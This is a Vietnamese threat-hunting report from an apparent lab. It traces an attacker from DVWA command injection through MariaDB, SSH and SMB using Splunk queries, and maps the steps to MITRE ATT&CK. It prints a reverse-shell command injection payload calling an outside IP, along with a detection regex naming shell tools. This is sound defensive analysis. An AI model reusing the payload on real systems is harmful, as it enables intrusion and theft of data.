# Threat Hunting

## 1. Thêm các index log để phân tích

Phần triển khai được tách thành các hướng dẫn độc lập để dễ thực hiện và kiểm tra theo từng nguồn log.

### 1.1. Log MariaDB

Đọc [Hướng dẫn bật MariaDB Audit Log](01-mariadb-audit.md).

### 1.2. Log audit của WEB01

Đọc [Hướng dẫn audit process và network của WEB01](02-web-audit.md).

### 1.3. Log audit của CL01

Đọc [Hướng dẫn audit command trên CL01](03-cl01-audit.md).

### 1.4. Log payload của HTTP POST

Đọc [Hướng dẫn log payload HTTP POST của DVWA](04-web-payload.md).

### 1.5. Log SMB

Đọc [Hướng dẫn bật Samba full audit và index SMB](05-smb-audit.md).

## 2. Threat Hunting

### 2.1. Phát hiện process bất thường của `www-data` trên WEB01

Với một suy nghĩ thông thường, đầu tiên ta kiểm tra xem có tiến trình nào bất thường từ user `www-data` trên `web01` hay không.

SPL sử dụng:

```spl
index=linux_audit host=web01 sourcetype=auditd
    (key=web_process_exec OR type=EXECVE)
| eval audit_event=msg
| stats
    min(_time) as _time
    values(eval(if(key="web_process_exec", euid, null()))) as euid
    values(eval(if(key="web_process_exec", uid, null()))) as uid
    values(eval(if(key="web_process_exec", success, null()))) as syscall_success
    values(eval(if(key="web_process_exec", comm, null()))) as comm
    values(eval(if(key="web_process_exec", exe, null()))) as exe
    values(eval(if(key="web_process_exec", pid, null()))) as pid
    values(eval(if(type="EXECVE", argc, null()))) as argc
    values(eval(if(type="EXECVE", a0, null()))) as arg0
    values(eval(if(type="EXECVE", a1, null()))) as arg1
    values(eval(if(type="EXECVE", a2, null()))) as arg2
    values(eval(if(type="EXECVE", a3, null()))) as arg3
    values(eval(if(type="EXECVE", a4, null()))) as arg4
    values(eval(if(type="EXECVE", a5, null()))) as arg5
    values(eval(if(type="EXECVE", a6, null()))) as arg6
    values(eval(if(type="EXECVE", a7, null()))) as arg7
    values(eval(if(type="EXECVE", a8, null()))) as arg8
    values(eval(if(type="EXECVE", a9, null()))) as arg9
    values(eval(if(type="EXECVE", a10, null()))) as arg10
    values(eval(if(type="EXECVE", a11, null()))) as arg11
    values(eval(if(type="EXECVE", a12, null()))) as arg12
    values(eval(if(type="EXECVE", a13, null()))) as arg13
    values(eval(if(type="EXECVE", a14, null()))) as arg14
    values(eval(if(type="EXECVE", a15, null()))) as arg15
    values(eval(if(type="EXECVE", a16, null()))) as arg16
    values(eval(if(type="EXECVE", a17, null()))) as arg17
    by audit_event
| where euid=33 OR uid=33
| eval user="www-data"
| eval args=mvappend(
    arg0,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,
    arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17
  )
| eval args=mvfilter(isnotnull(args) AND args!="")
| eval full_command=mvjoin(args, " ")
| eval result=case(
    lower(syscall_success)="yes" OR lower(syscall_success)="success"
        OR syscall_success="1", "success",
    lower(syscall_success)="no" OR lower(syscall_success)="failed"
        OR syscall_success="0", "failed",
    isnull(syscall_success) OR syscall_success="", "unknown",
    true(), "unknown"
  )
| table _time user full_command comm exe syscall_success result pid argc audit_event
| sort - _time
```

SPL trên giúp xem các lệnh mà user `www-data` đã thực hiện trên `web01`:

- Lấy log `auditd` có key `web_process_exec` (bản ghi SYSCALL) và `type=EXECVE` (bản ghi chứa argument của lệnh).
- `stats ... by audit_event` gộp hai loại bản ghi của cùng một sự kiện thành một dòng.
- `where euid=33 OR uid=33` chỉ giữ tiến trình chạy bởi `www-data` (UID 33).
- `mvappend` và `mvjoin` ghép các argument `a0` đến `a17` thành `full_command`; `case` chuẩn hóa kết quả thành `success`, `failed` hoặc `unknown`.

Ta phát hiện có các tiến trình bash bất thường trong khoảng thời gian `21:15`, không phải là thời gian hành chính.

![alt text](img/image.png)

Ta decode chuỗi hex `62617368202D69203E26202F6465762F7463702F3139322E3136382E3234352E3130302F34343320303E2631` thì kết quả tương ứng là `bash -i >& /dev/tcp/192.168.245.100/443 0>&1`, một lệnh kết nối reverse shell đến `192.168.245.100:443`.

(Lệnh trên được encode hex vì `auditd` encode hex khi argument chứa ký tự đặc biệt hoặc khoảng trắng.)

Sau đó ta cũng thấy attacker thực hiện recon (`ls`, `whoami`, `ss -tlpun`) và kết nối MariaDB bằng user `root` (ta cho phép login mà không cần password).

### 2.2. Kiểm tra hoạt động MariaDB

Vì attacker đã truy cập thành công database MariaDB nên ta kiểm tra xem attacker đã thực hiện gì trên database.

Sử dụng SPL sau:

```spl
index=database_web sourcetype="mariadb:audit" host=web01 earliest=-60m
| rex field=_raw "^[^,]+,[^,]+,(?<db_user>[^,]+),(?<client_host>[^,]+),(?<connection_id>[^,]+),(?<query_id>[^,]+),(?<operation>[^,]+),(?<database_name>[^,]*),(?<query_or_object>.*),(?<return_code>[^,]*)$"
| eval result=case(
    return_code="0", "success",
    return_code!="" AND return_code!="0", "failed",
    in(operation, "CONNECT", "DISCONNECT", "QUERY", "READ", "WRITE"), "logged",
    true(), "unknown"
  )
| eval activity=case(
    in(operation, "CONNECT", "DISCONNECT"), "connection",
    operation="QUERY", "query",
    operation="READ", "table_read",
    operation="WRITE", "table_write",
    true(), "other"
  )
| table _time db_user client_host connection_id query_id operation
    database_name query_or_object return_code result activity
    host source sourcetype
| sort - +_time
| where _time >= strptime("2026-11-05 21:15:54", "%Y-%m-%d %H:%M:%S")
```

SPL trên giúp xem các action được thực hiện trên database kể từ `2026-11-05 21:15:54` (lúc attacker thực hiện lệnh `mariadb -u root`):

- `rex` tách từng dòng log CSV của MariaDB Audit Plugin thành các trường: user, client host, connection ID, query ID, operation, database, câu truy vấn/đối tượng và return code.
- `result` được suy ra từ `return_code` (`0` là thành công); `activity` nhóm `operation` thành connection, query, table_read, table_write hoặc other.
- `where _time >= ...` chỉ giữ các sự kiện từ thời điểm attacker đăng nhập MariaDB.

![alt text](img/image-1.png)

Ta thấy được attacker thực hiện recon database và đọc các table trong database `dvwa`, không thực hiện xóa/sửa database.

### 2.3. Đối chiếu Apache access log và IP nội bộ

Ta dùng lại SPL đầu tiên để kiểm tra xem attacker thực hiện gì trên `web01` sau khi truy cập MariaDB.

![alt text](img/image-2.png)

Ta thấy được thực hiện recon và đọc được file access log của Apache2, sau đó thì thực hiện brute force SSH đến `10.10.10.11` (một internal host) → có lẽ attacker đọc được IP internal host này thông qua file access log đó.

Ta dùng SPL sau để kiểm tra thật sự có IP `10.10.10.11` trong access log của web hay không:

```spl
index=web host=web01 sourcetype=access_combined
    clientip="10.10.10.11" earliest=-24h
| stats
    count AS requests
    min(_time) AS first_seen
    max(_time) AS last_seen
| eval result=if(requests>0, "FOUND", "NOT_FOUND")
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| eval last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")
| table result requests first_seen last_seen
```

SPL này giúp lọc `clientip="10.10.10.11"` trên index `web`:

- Tìm các request trong access log của Apache có client IP là `10.10.10.11`.
- `stats` đếm số request và lấy thời điểm xuất hiện đầu tiên, cuối cùng.
- `result` trả về `FOUND` nếu có ít nhất một request, ngược lại là `NOT_FOUND`.

![alt text](img/image-3.png)

→ Kết quả đúng như dự đoán, có IP `10.10.10.11` trong access log của web, và khả năng cao là attacker tìm được IP này qua access log đó.

### 2.4. Truy vết user SSH trên CL01

Câu hỏi tiếp theo là các username mà attacker sử dụng để SSH là từ đâu.

Ta kiểm tra lại các user trong database thì nhận thấy đúng với các user mà attacker thực hiện SSH.

![alt text](img/image-4.png)

Nhận thấy attacker đã thực hiện thành công vào một máy nhân viên `10.10.10.11` với user `nhanvien1`, ta kiểm tra các lệnh mà `nhanvien1` đã thực hiện trong khoảng thời gian đó.

Sử dụng SPL sau:

```spl
index=linux_audit host=cl01 sourcetype=auditd
    (key=command_execution OR type=EXECVE)
| eval audit_event=msg
| stats
    min(_time) as _time
    values(eval(if(key="command_execution", EUID, null()))) as audit_user
    values(eval(if(key="command_execution", uid, null()))) as uid
    values(eval(if(key="command_execution", success, null()))) as syscall_success
    values(eval(if(key="command_execution", comm, null()))) as comm
    values(eval(if(key="command_execution", exe, null()))) as exe
    values(eval(if(key="command_execution", pid, null()))) as pid
    values(eval(if(key="command_execution", ppid, null()))) as ppid
    values(eval(if(key="command_execution", auid, null()))) as auid
    values(eval(if(type="EXECVE", argc, null()))) as argc
    values(eval(if(type="EXECVE", a0, null()))) as arg0
    values(eval(if(type="EXECVE", a1, null()))) as arg1
    values(eval(if(type="EXECVE", a2, null()))) as arg2
    values(eval(if(type="EXECVE", a3, null()))) as arg3
    values(eval(if(type="EXECVE", a4, null()))) as arg4
    values(eval(if(type="EXECVE", a5, null()))) as arg5
    values(eval(if(type="EXECVE", a6, null()))) as arg6
    values(eval(if(type="EXECVE", a7, null()))) as arg7
    values(eval(if(type="EXECVE", a8, null()))) as arg8
    values(eval(if(type="EXECVE", a9, null()))) as arg9
    values(eval(if(type="EXECVE", a10, null()))) as arg10
    values(eval(if(type="EXECVE", a11, null()))) as arg11
    values(eval(if(type="EXECVE", a12, null()))) as arg12
    values(eval(if(type="EXECVE", a13, null()))) as arg13
    values(eval(if(type="EXECVE", a14, null()))) as arg14
    values(eval(if(type="EXECVE", a15, null()))) as arg15
    values(eval(if(type="EXECVE", a16, null()))) as arg16
    values(eval(if(type="EXECVE", a17, null()))) as arg17
    by audit_event
| where audit_user="nhanvien1" OR uid=1001
| eval user=coalesce(audit_user, "nhanvien1")
| eval args=mvappend(
    arg0,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9,
    arg10,arg11,arg12,arg13,arg14,arg15,arg16,arg17
  )
| eval args=mvfilter(isnotnull(args) AND args!="")
| eval full_command=mvjoin(args, " ")
| eval result=case(
    lower(syscall_success)="yes" OR lower(syscall_success)="success"
        OR syscall_success="1", "success",
    lower(syscall_success)="no" OR lower(syscall_success)="failed"
        OR syscall_success="0", "failed",
    isnull(syscall_success) OR syscall_success="", "unknown",
    true(), "unknown"
  )
| table _time user full_command comm exe syscall_success result
    pid ppid auid argc audit_event
| sort - +_time
| where _time >= strptime("2026-11-05 21:18:00", "%Y-%m-%d %H:%M:%S")
```

SPL này giúp xem các lệnh mà user `nhanvien1` thực hiện trên `cl01`:

- Có cấu trúc tương tự SPL ở mục 2.1, nhưng lấy log `auditd` của `cl01` với key `command_execution` và `type=EXECVE`.
- `where audit_user="nhanvien1" OR uid=1001` chỉ giữ các lệnh của user `nhanvien1`.
- `where _time >= ...` giới hạn kết quả từ `2026-11-05 21:18:00`, tức khoảng thời gian attacker SSH vào máy này.

Kết quả:

![alt text](img/image-5.png)

→ Nhận thấy attacker đọc được file `.smbcred` chứa credential SMB và thực hiện kết nối đến SMB server (`10.10.10.11`) với user `ketoan1`, sau đó lấy được và đọc secret file `khachhang.csv`.

### 2.5. Kiểm tra hoạt động SMB sau khi SSH

Ta kiểm tra log SMB trong thời gian đó để kiểm tra attacker có thực hiện điều gì khác trên SMB server không.

Ta sử dụng SPL:

```spl
index=smb sourcetype="samba:full_audit" earliest=-24h
| rex field=_raw "smbd_audit: (?<audit_user>[^|]+)\\|(?<client_ip>[^|]+)\\|(?<client_host>[^|]+)\\|(?<share>[^|]+)\\|(?<operation>[^|]+)\\|(?<result>[^|]+)\\|(?<object>.*)"
| eval activity=case(
    in(operation,"connect","disconnect"), "connection",
    in(operation,"open","close","pread","read","pwrite","write"), "file_access",
    in(operation,"mkdirat","renameat","unlinkat"), "file_change",
    true(), "other"
  )
| eval action_result=case(
    lower(result)="ok" OR lower(result)="success", "success",
    lower(result)="failed" OR lower(result)="failure", "failed",
    true(), result
  )
| where action_result="success"
| table _time audit_user client_ip client_host share activity operation
    action_result object host source sourcetype
| sort 0 - +_time
| where _time >= strptime("2026-11-05 21:18:00", "%Y-%m-%d %H:%M:%S")
```

SPL này giúp xem các thao tác thành công trên SMB server kể từ `2026-11-05 21:18:00`:

- `rex` tách dòng log `smbd_audit` (các trường phân tách bằng `|`) thành user, client IP, client host, share, operation, result và object.
- `activity` nhóm `operation` thành connection, file_access, file_change hoặc other.
- `where action_result="success"` chỉ giữ các thao tác thành công.

Kết quả:

![alt text](img/image-6.png)

Nhận thấy attacker thực hiện đọc file `khachhang.csv`, và có lẽ không thực hiện gì khác.

### 2.6. Đối chiếu payload command injection

Tiếp theo ta cần xác định payload khiến web thực hiện reverse shell, ta kiểm tra xem có HTTP request có payload pattern reverse shell gửi đến không.

Ta dùng SPL sau:

```spl
index=web host=web01 sourcetype="dvwa:application" earliest=-24h
| spath
| search event="dvwa_command_injection" phase=start
| eval injection_indicator=if(
    match(payload,"(;|\\||&&|\\$\\(|\\x60|/dev/tcp|\\b(id|whoami|pwd|uname|curl|wget)\\b)"),
    "suspicious",
    "other"
  )
| where injection_indicator="suspicious"
| table _time request_id src_ip user http_method request_uri
    payload executed_command security_level injection_indicator
| sort 0 - _time
```

SPL này kiểm tra xem có payload nào gửi đến đồng thời lệnh thực hiện là gì trong chức năng command injection của web:

- `spath` parse log ứng dụng DVWA (định dạng JSON); `search` chỉ giữ sự kiện `dvwa_command_injection` ở giai đoạn `start`.
- `match(payload, ...)` đánh dấu `suspicious` cho payload chứa ký tự nối lệnh (`;`, `|`, `&&`, `$(`, dấu backtick), chuỗi `/dev/tcp` hoặc các lệnh như `id`, `whoami`, `pwd`, `uname`, `curl`, `wget`.
- `table` hiển thị thời gian, IP nguồn, request URI, `payload` và `executed_command` để đối chiếu với lệnh mà `www-data` đã chạy.

Kết quả:

![alt text](img/image-7.png)

Ta thấy được có payload `127.0.0.1;bash -c "bash -i >& /dev/tcp/192.168.245.100/443 0>&1"` gửi đến route `/DVWA/vulnerabilities/exec/`, đúng với lệnh mà `www-data` đã thực hiện.

→ Ta sẽ kiểm tra lại payload với route `/DVWA/vulnerabilities/exec/` để xem route này có đang bị lỗi command injection hay không.

### 2.7. Kết luận luồng exploit

Sau khi thực hiện threat hunting, ta biết được luồng exploit của attacker như sau:

- Exploit command injection ở route `/DVWA/vulnerabilities/exec/`, từ đó lấy được reverse shell của `web01`.
- Thực hiện recon, login MariaDB ở localhost với user `root` (không cần password), từ đó đọc được toàn bộ database `dvwa`.
- Đọc file access log của Apache và thấy được internal IP của một máy nhân viên là `10.10.10.11`.
- Thực hiện brute force SSH đến máy nhân viên, sử dụng credential trong table `users` mà attacker đọc được trong database.
- Sau khi SSH thành công đến `10.10.10.11` thì kết nối đến SMB server, sử dụng credential trong file `.smbcred` và đọc được file secret `khachhang.csv`.

→ Luồng exploit hunt được tương đương với kịch bản tấn công nhóm đã trình bày.

#### Mapping luồng exploit với các kỹ thuật MITRE ATT&CK tương ứng

| # | Attack activity | MITRE ATT&CK ID | Technique | Tactic |
|---|---|---|---|---|
| 1 | Exploit command injection tại DVWA `/vulnerabilities/exec/` | T1190 | Exploit Public-Facing Application | Initial Access |
| 2 | Execute command trên `web01` thông qua command injection | T1059.004 | Unix Shell | Execution |
| 3 | Establish reverse shell đến `web01` | T1059.004 | Unix Shell | Execution |
| 4 | Recon và truy cập MariaDB bằng tài khoản `root` không có password | T1078.001 | Default Accounts | Initial Access, Persistence, Privilege Escalation, Defense Evasion |
| 5 | Enumerate và đọc dữ liệu database `dvwa` | T1213 | Data from Information Repositories | Collection |
| 6 | Đọc Apache access log để xác định internal IP `10.10.10.11` | T1654 | Log Enumeration | Discovery |
| 7 | Brute force SSH sử dụng credential thu thập từ database | T1110.004 | Credential Stuffing | Credential Access |
| 8 | SSH từ `web01` sang máy nhân viên `10.10.10.11` | T1021.004 | SSH | Lateral Movement |
| 9 | Sử dụng credential trong `.smbcred` để truy cập SMB server | T1078 | Valid Accounts | Defense Evasion, Persistence, Privilege Escalation, Initial Access |
| 10 | Kết nối SMB server | T1021.002 | SMB/Windows Admin Shares | Lateral Movement |
| 11 | Đọc file `secret_khachhang.csv` trên SMB share | T1039 | Data from Network Shared Drive | Collection |